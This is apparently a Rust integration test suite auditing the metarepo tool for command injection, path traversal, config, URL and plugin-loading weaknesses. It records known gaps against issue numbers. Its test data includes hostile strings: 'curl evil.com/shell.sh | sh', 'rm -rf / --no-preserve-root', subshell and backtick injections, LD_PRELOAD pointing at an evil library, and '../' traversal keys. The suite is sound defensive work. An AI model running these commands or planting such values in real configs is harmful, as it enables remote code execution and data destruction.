// Security Test Suite for Metarepo
//
// Tests real metarepo code paths for security vulnerabilities.
// Organized by the six areas from issue #1:
//   1. Command injection prevention in shell command execution
//   2. Path traversal prevention in file operations
//   3. Safe handling of user input in config files
//   4. Validation of URLs and git repository paths
//   5. Secure handling of external plugin execution
//   6. Proper sanitization of TUI input fields
//
// Tests marked #[ignore] document known gaps — each links to a follow-up issue.

use metarepo_core::{MetaConfig, ProjectEntry, ProjectMetadata};
use std::collections::HashMap;
use std::path::Path;
use tempfile::TempDir;

// ---------------------------------------------------------------------------
// 1. Command injection prevention
// ---------------------------------------------------------------------------
mod command_injection {
    use super::*;
    use metarepo::plugins::exec;

    /// exec uses Command::new(command).args(args) — no shell involved.
    /// Verify that shell metacharacters in the command name do NOT trigger
    /// shell expansion (they're passed literally to execvp).
    #[test]
    fn exec_does_not_invoke_shell() {
        let tmp = TempDir::new().unwrap();
        let dir = tmp.path();

        // "echo hello; touch EVIL" as a single command name should fail to
        // find that executable — it must NOT be interpreted by a shell.
        let result = exec::execute_command_in_directory("echo hello; touch EVIL", &[], dir);

        // The spawn should fail (no such executable)
        assert!(
            result.is_err(),
            "Shell metacharacter command should fail as literal executable name"
        );

        // Crucially, no file named "EVIL" should have been created
        assert!(
            !dir.join("EVIL").exists(),
            "Shell injection via command name must not create files"
        );
    }

    /// Verify that shell metacharacters in args are passed literally,
    /// not interpreted by a shell.
    #[test]
    fn exec_args_are_not_shell_expanded() {
        let tmp = TempDir::new().unwrap();
        let dir = tmp.path();

        // Use 'echo' (which exists) with a subshell injection in the arg.
        // Because exec uses Command (not sh -c), $(whoami) should be printed
        // literally, not expanded.
        let result = exec::execute_command_in_directory_buffered("echo", &["$(touch EVIL)"], dir);

        // echo should succeed
        assert!(result.is_ok(), "echo with literal arg should succeed");

        // The subshell must NOT have been executed
        assert!(
            !dir.join("EVIL").exists(),
            "Shell expansion in exec args must not execute subshells"
        );

        // stdout should contain the literal string "$(touch EVIL)"
        let (code, stdout, _, _) = result.unwrap();
        assert_eq!(code, 0);
        let output = String::from_utf8_lossy(&stdout);
        assert!(
            output.contains("$(touch EVIL)"),
            "Arg should be passed literally, got: {}",
            output
        );
    }

    /// Verify that pipe characters in args are not interpreted.
    #[test]
    fn exec_pipe_in_args_is_literal() {
        let tmp = TempDir::new().unwrap();
        let dir = tmp.path();

        let result =
            exec::execute_command_in_directory_buffered("echo", &["hello", "|", "cat"], dir);

        assert!(result.is_ok());
        let (code, stdout, _, _) = result.unwrap();
        assert_eq!(code, 0);
        let output = String::from_utf8_lossy(&stdout);
        // Should print "hello | cat" literally
        assert!(
            output.contains("hello | cat") || output.contains("hello") && output.contains("|"),
            "Pipe should be literal arg, got: {}",
            output
        );
    }

    /// Verify that backtick injection in args is not executed.
    #[test]
    fn exec_backtick_in_args_is_literal() {
        let tmp = TempDir::new().unwrap();
        let dir = tmp.path();

        let result = exec::execute_command_in_directory_buffered("echo", &["`touch EVIL`"], dir);

        assert!(result.is_ok());
        assert!(
            !dir.join("EVIL").exists(),
            "Backtick injection must not execute"
        );
    }
}

// ---------------------------------------------------------------------------
// 2. Path traversal prevention
// ---------------------------------------------------------------------------
mod path_traversal {
    use super::*;

    /// MetaConfig allows project keys with path traversal sequences.
    /// This test documents the current behavior — keys are stored as-is
    /// in the HashMap without validation.
    ///
    /// SECURITY GAP: project keys like "../../etc" are accepted and later
    /// used in base_path.join(project_name) without canonicalization.
    /// Tracked by issue #11 (config validation).
    #[test]
    fn config_accepts_traversal_in_project_keys() {
        let tmp = TempDir::new().unwrap();
        let meta_path = tmp.path().join(".meta");

        let mut config = MetaConfig::default();
        config.projects.insert(
            "../../etc/evil".to_string(),
            ProjectEntry::Url("https://github.com/user/repo.git".to_string()),
        );

        config.save_to_file(&meta_path).unwrap();
        let loaded = MetaConfig::load_from_file(&meta_path).unwrap();

        // CURRENT BEHAVIOR: traversal key is accepted without validation
        assert!(
            loaded.projects.contains_key("../../etc/evil"),
            "Path traversal key is currently accepted (no validation)"
        );
    }

    /// import_project_with_options joins base_path with an untrusted
    /// project_path. Verify that when the input contains `../`, the
    /// resulting canonical path escapes the base directory.
    ///
    /// SECURITY GAP: No canonicalization check exists in
    /// import_project_with_options. base_path.join("../../x") followed by
    /// canonicalize() produces a path outside the workspace — but the code
    /// never canonicalizes for safety. Tracked by issue #8.
    #[test]
    fn import_project_path_join_is_unchecked() {
        // Create a nested tmp layout: /tmp/X/inner where inner is our "base"
        let outer = TempDir::new().unwrap();
        let inner_base = outer.path().join("inner");
        std::fs::create_dir(&inner_base).unwrap();
        // Create a sibling directory we'll try to "escape" to
        let sibling = outer.path().join("sibling");
        std::fs::create_dir(&sibling).unwrap();

        // Untrusted input with traversal
        let untrusted = "../sibling";
        let joined = inner_base.join(untrusted);

        // Canonicalize both — this is what the code SHOULD do to check safety
        let canonical_target = joined.canonicalize().unwrap();
        let canonical_base = inner_base.canonicalize().unwrap();

        // The canonical target escapes the base
        assert!(
            !canonical_target.starts_with(&canonical_base),
            "Canonical path with ../ escapes base — import_project_with_options does not check this"
        );
    }

    /// Worktree add joins branch name directly into paths.
    /// Verify that a branch name with ../ escapes the worktree base when
    /// canonicalized.
    ///
    /// SECURITY GAP: branch names are used directly in path joins with
    /// no canonicalization check in add_worktrees. Tracked by issue #9.
    #[test]
    fn worktree_branch_path_join_is_unchecked() {
        // Simulate worktree layout: project/.worktrees/<branch>
        let outer = TempDir::new().unwrap();
        let project = outer.path().join("project");
        let worktrees_dir = project.join(".worktrees");
        std::fs::create_dir_all(&worktrees_dir).unwrap();

        // Create an "escape target" sibling directory
        let escape_target = outer.path().join("escape_target");
        std::fs::create_dir(&escape_target).unwrap();

        // Untrusted branch with traversal
        let branch = "../../escape_target";
        let worktree_path = worktrees_dir.join(branch);

        let canonical_target = worktree_path.canonicalize().unwrap();
        let canonical_project = project.canonicalize().unwrap();

        assert!(
            !canonical_target.starts_with(&canonical_project),
            "Branch name with ../ escapes project dir — gap in add_worktrees"
        );
    }
}

// ---------------------------------------------------------------------------
// 3. Config file safety
// ---------------------------------------------------------------------------
mod config_safety {
    use super::*;

    /// Verify that MetaConfig round-trips correctly through JSON serialization.
    #[test]
    fn config_roundtrip_preserves_data() {
        let tmp = TempDir::new().unwrap();
        let meta_path = tmp.path().join(".meta");

        let mut config = MetaConfig::default();
        config.projects.insert(
            "test-project".to_string(),
            ProjectEntry::Metadata(ProjectMetadata {
                url: "https://github.com/user/repo.git".to_string(),
                aliases: vec!["tp".to_string()],
                scripts: {
                    let mut s = HashMap::new();
                    s.insert("build".to_string(), "cargo build".to_string());
                    s
                },
                env: HashMap::new(),
                worktree_init: None,
                bare: None,
            }),
        );

        config.save_to_file(&meta_path).unwrap();
        let loaded = MetaConfig::load_from_file(&meta_path).unwrap();

        assert_eq!(loaded.projects.len(), 1);
        assert!(loaded.projects.contains_key("test-project"));
    }

    /// Verify that malformed JSON is rejected, not silently accepted.
    #[test]
    fn config_rejects_malformed_json() {
        let tmp = TempDir::new().unwrap();
        let meta_path = tmp.path().join(".meta");

        std::fs::write(&meta_path, "{ not valid json }}}").unwrap();

        let result = MetaConfig::load_from_file(&meta_path);
        assert!(result.is_err(), "Malformed JSON should be rejected");
    }

    /// Verify behavior with extremely long project keys.
    #[test]
    fn config_handles_very_long_project_key() {
        let tmp = TempDir::new().unwrap();
        let meta_path = tmp.path().join(".meta");

        let long_key = "a".repeat(10_000);
        let mut config = MetaConfig::default();
        config.projects.insert(
            long_key.clone(),
            ProjectEntry::Url("https://example.com/repo.git".to_string()),
        );

        config.save_to_file(&meta_path).unwrap();
        let loaded = MetaConfig::load_from_file(&meta_path).unwrap();
        assert!(loaded.projects.contains_key(&long_key));
    }

    /// Script commands from config are split by whitespace and passed to
    /// Command::new(). Verify that the split_whitespace approach preserves
    /// shell metacharacters as literal tokens.
    ///
    /// SECURITY GAP: While Command::new doesn't invoke a shell, the naive
    /// split_whitespace means quoted arguments with spaces won't work
    /// correctly, and a malicious script value like "rm -rf /" would
    /// execute rm with args ["-rf", "/"]. The config is user-editable,
    /// so this is a trust-boundary concern. Tracked by issue #14.
    #[test]
    fn script_command_split_whitespace_behavior() {
        // Simulate what run_script does: split a script command
        let script_cmd = "npm run test && curl evil.com";
        let parts: Vec<&str> = script_cmd.split_whitespace().collect();

        // split_whitespace produces literal tokens — && is just a string token
        assert_eq!(parts[0], "npm");
        assert_eq!(parts[3], "&&");
        assert_eq!(parts[4], "curl");

        // When passed to Command::new("npm").args(&["run", "test", "&&", "curl", "evil.com"]),
        // "&&" is a literal argument to npm, NOT a shell operator.
        // This is safe for Command but could be confusing if the user expected
        // shell behavior. The real danger is that parts[0] is used as the executable.
    }

    /// Verify that a script config value with just whitespace produces
    /// an empty parts vector.
    #[test]
    fn empty_script_command_produces_empty_parts() {
        let script_cmd = "   ";
        let parts: Vec<&str> = script_cmd.split_whitespace().collect();
        assert!(
            parts.is_empty(),
            "Whitespace-only script should produce no parts"
        );
    }

    /// SECURITY GAP: worktree_init is passed directly to sh -c without
    /// any sanitization. A malicious config can execute arbitrary shell code.
    ///
    /// This is by design (it's a user hook), but there's no warning, no
    /// confirmation prompt, and the value comes from .meta which could be
    /// committed by another contributor. Tracked by issue #10.
    #[test]
    fn worktree_init_stored_without_sanitization() {
        let mut config = MetaConfig::default();
        let dangerous_init = "curl evil.com/shell.sh | sh";

        config.projects.insert(
            "test-project".to_string(),
            ProjectEntry::Metadata(ProjectMetadata {
                url: "https://github.com/user/repo.git".to_string(),
                aliases: vec![],
                scripts: HashMap::new(),
                env: HashMap::new(),
                worktree_init: Some(dangerous_init.to_string()),
                bare: None,
            }),
        );

        // The config stores the value as-is — no sanitization
        let init = config.get_worktree_init("test-project");
        assert_eq!(
            init.as_deref(),
            Some(dangerous_init),
            "worktree_init is stored verbatim with no sanitization"
        );
    }

    /// worktree_init falls back from project-level to global config.
    #[test]
    fn worktree_init_fallback_chain() {
        let mut config = MetaConfig {
            worktree_init: Some("echo global".to_string()),
            ..Default::default()
        };

        // Project without its own worktree_init falls back to global
        config.projects.insert(
            "project-a".to_string(),
            ProjectEntry::Url("https://github.com/user/a.git".to_string()),
        );

        assert_eq!(
            config.get_worktree_init("project-a").as_deref(),
            Some("echo global"),
            "Should fall back to global worktree_init"
        );

        // Project with its own worktree_init overrides global
        config.projects.insert(
            "project-b".to_string(),
            ProjectEntry::Metadata(ProjectMetadata {
                url: "https://github.com/user/b.git".to_string(),
                aliases: vec![],
                scripts: HashMap::new(),
                env: HashMap::new(),
                worktree_init: Some("echo project".to_string()),
                bare: None,
            }),
        );

        assert_eq!(
            config.get_worktree_init("project-b").as_deref(),
            Some("echo project"),
            "Project-level worktree_init should override global"
        );
    }

    /// Environment variables from config are passed to child processes
    /// without filtering. Verify that dangerous env vars (LD_PRELOAD, etc.)
    /// are stored in config without any blocklist.
    ///
    /// SECURITY GAP: No env var blocklist exists. Tracked by issue #11.
    #[test]
    fn env_vars_not_filtered_in_config() {
        let mut env = HashMap::new();
        env.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
        env.insert("BASH_ENV".to_string(), "/tmp/evil.sh".to_string());

        let config_entry = ProjectMetadata {
            url: "https://github.com/user/repo.git".to_string(),
            aliases: vec![],
            scripts: HashMap::new(),
            env,
            worktree_init: None,
            bare: None,
        };

        // CURRENT BEHAVIOR: dangerous env vars are stored and would be
        // passed to child processes via cmd.env(key, value)
        assert!(config_entry.env.contains_key("LD_PRELOAD"));
        assert!(config_entry.env.contains_key("BASH_ENV"));
    }
}

// ---------------------------------------------------------------------------
// 4. URL and git repository path validation
// ---------------------------------------------------------------------------
mod url_validation {
    use super::*;

    /// import_project_with_options checks URL prefixes (http, git@, ssh://)
    /// to distinguish URLs from local paths. Verify the scheme detection
    /// logic by testing the same conditions the code uses.
    #[test]
    fn url_scheme_detection_patterns() {
        // These are the checks from project/mod.rs:172
        let test_cases = vec![
            ("https://github.com/user/repo.git", true),
            ("http://github.com/user/repo.git", true),
            ("git@github.com:user/repo.git", true),
            ("ssh://git@github.com/user/repo.git", true),
            ("file:///etc/passwd", false),   // Not detected as URL
            ("gopher://evil.com", false),    // Not detected as URL
            ("/absolute/local/path", false), // Local path
            ("relative/local/path", false),  // Local path
        ];

        for (input, expected_is_url) in test_cases {
            let is_url = input.starts_with("http")
                || input.starts_with("git@")
                || input.starts_with("ssh://");
            assert_eq!(
                is_url, expected_is_url,
                "URL detection for '{}': expected={}, got={}",
                input, expected_is_url, is_url
            );
        }
    }

    /// SECURITY GAP: git:// protocol (unauthenticated, unencrypted) is not
    /// explicitly handled — it falls through to the "local path" branch.
    /// Tracked by issue #13.
    #[test]
    fn git_protocol_not_detected_as_url() {
        let input = "git://github.com/user/repo.git";
        let is_url =
            input.starts_with("http") || input.starts_with("git@") || input.starts_with("ssh://");
        assert!(
            !is_url,
            "git:// protocol is not detected as a URL — falls through to local path handling"
        );
    }

    /// Verify that MetaConfig stores arbitrary URL strings without validation.
    #[test]
    fn config_stores_urls_without_format_validation() {
        let tmp = TempDir::new().unwrap();
        let meta_path = tmp.path().join(".meta");

        let mut config = MetaConfig::default();
        config.projects.insert(
            "evil-project".to_string(),
            ProjectEntry::Url("not-a-valid-url-at-all!!!".to_string()),
        );

        config.save_to_file(&meta_path).unwrap();
        let loaded = MetaConfig::load_from_file(&meta_path).unwrap();

        assert_eq!(
            loaded.get_project_url("evil-project").as_deref(),
            Some("not-a-valid-url-at-all!!!"),
            "URLs are stored without format validation"
        );
    }
}

// ---------------------------------------------------------------------------
// 5. Plugin execution safety
// ---------------------------------------------------------------------------
mod plugin_safety {
    use super::*;

    /// ExternalPlugin::load accepts any Path and spawns it as a subprocess.
    /// Verify that pointing it at a non-existent path fails gracefully
    /// rather than causing undefined behavior.
    #[test]
    fn plugin_load_nonexistent_path_fails() {
        let result =
            metarepo::plugins::ExternalPlugin::load(Path::new("/nonexistent/path/to/plugin"));
        assert!(
            result.is_err(),
            "Loading a non-existent plugin path should fail"
        );
    }

    /// ExternalPlugin::load accepts absolute paths outside the plugins
    /// directory. There is no path validation.
    ///
    /// SECURITY GAP: Any path can be passed to ExternalPlugin::load.
    /// No check ensures the path is within the expected plugins directory.
    /// Tracked by issue #12.
    #[test]
    fn plugin_load_accepts_absolute_paths() {
        // /bin/echo exists and is executable, but it doesn't speak the
        // plugin protocol, so it will fail at the protocol level —
        // the important thing is that path validation doesn't reject it.
        let result = metarepo::plugins::ExternalPlugin::load(Path::new("/bin/echo"));

        // It will fail because /bin/echo doesn't respond with the plugin protocol,
        // NOT because the path is rejected. This documents the gap:
        // there is no path validation before spawning.
        let err_msg = match result {
            Ok(_) => panic!("/bin/echo should not load successfully as a plugin"),
            Err(e) => e.to_string(),
        };

        // The error should be about protocol, not "path not allowed"
        assert!(
            !err_msg.contains("not allowed") && !err_msg.contains("invalid path"),
            "Error should be protocol-related, not path-related — no path validation exists. Got: {}",
            err_msg
        );
    }

    /// Verify that plugin paths with traversal sequences are not rejected.
    ///
    /// SECURITY GAP: No traversal check on plugin paths. Tracked by issue #12.
    #[test]
    fn plugin_load_does_not_reject_traversal_paths() {
        // Attempt to load a plugin with ../ in the path
        let result = metarepo::plugins::ExternalPlugin::load(Path::new("../../../usr/bin/true"));

        // Will fail because /usr/bin/true doesn't speak plugin protocol,
        // but the path itself is not rejected
        assert!(
            result.is_err(),
            "Should fail, but at protocol or spawn level, not path validation"
        );
    }
}

// ---------------------------------------------------------------------------
// 6. TUI input sanitization
// ---------------------------------------------------------------------------
mod tui_input {
    // The TUI module (metarepo_core::tui, metarepo_core::interactive) handles
    // user prompts via the dialoguer crate. The interactive functions
    // (prompt_text, prompt_url, prompt_confirm, etc.) are re-exported from
    // metarepo_core but they all require terminal interaction and cannot be
    // meaningfully tested in a headless integration test.
    //
    // Key observations from code review:
    // - prompt_url() does basic URL format validation via dialoguer
    // - prompt_text() accepts arbitrary strings without sanitization
    // - All input goes through dialoguer which handles terminal I/O safely
    //
    // For TUI security testing, consider:
    // - Testing prompt_url validation patterns if they become configurable
    // - Fuzz testing TUI input handlers (see fuzz/ directory)
    //
    // No programmatic tests are possible without mocking the terminal.
    // This module exists to document the audit.

    #[test]
    fn tui_security_audit_documented() {
        // This test exists to ensure the TUI security audit is not forgotten.
        // The actual TUI testing requires interactive terminal access or a
        // mock terminal framework.
        //
        // If you're adding new TUI input handling, ensure:
        // 1. User input is not passed directly to shell commands
        // 2. File paths from TUI are validated before use
        // 3. URLs from TUI are validated before git clone
        //
        // Verify the interactive module is reachable from integration tests
        // (prevents accidental removal of the pub re-exports).
        use metarepo_core::NonInteractiveMode;
        let _ = NonInteractiveMode::Defaults;
    }
}

// ---------------------------------------------------------------------------
// Cross-cutting: exec + config integration
// ---------------------------------------------------------------------------
mod exec_config_integration {
    use super::*;
    use metarepo::plugins::exec;

    /// Verify that execute_command_in_directory works correctly in a temp
    /// directory (smoke test that the function is callable and sandboxable).
    #[test]
    fn exec_in_temp_dir_works() {
        let tmp = TempDir::new().unwrap();

        let result = exec::execute_command_in_directory_buffered("echo", &["hello"], tmp.path());

        assert!(result.is_ok());
        let (code, stdout, _, _) = result.unwrap();
        assert_eq!(code, 0);
        assert!(String::from_utf8_lossy(&stdout).contains("hello"));
    }

    /// Verify that execute_command_in_directory_buffered fails gracefully
    /// when the working directory doesn't exist.
    #[test]
    fn exec_in_nonexistent_dir_fails() {
        let result = exec::execute_command_in_directory_buffered(
            "echo",
            &["test"],
            "/nonexistent/directory/that/should/not/exist",
        );

        assert!(result.is_err(), "Exec in nonexistent directory should fail");
    }

    /// Verify config can store and retrieve scripts that will be
    /// passed to Command::new via split_whitespace.
    #[test]
    fn config_script_retrieval() {
        let mut config = MetaConfig::default();
        let mut scripts = HashMap::new();
        scripts.insert("test".to_string(), "cargo test --all".to_string());
        scripts.insert(
            "dangerous".to_string(),
            "rm -rf / --no-preserve-root".to_string(),
        );

        config.projects.insert(
            "my-project".to_string(),
            ProjectEntry::Metadata(ProjectMetadata {
                url: "https://github.com/user/repo.git".to_string(),
                aliases: vec![],
                scripts,
                env: HashMap::new(),
                worktree_init: None,
                bare: None,
            }),
        );

        let all_scripts = config.get_all_scripts(Some("my-project"));

        // Both safe and dangerous scripts are stored identically
        assert_eq!(all_scripts.get("test").unwrap(), "cargo test --all");
        assert_eq!(
            all_scripts.get("dangerous").unwrap(),
            "rm -rf / --no-preserve-root",
            "Dangerous script commands are stored without validation"
        );
    }
}
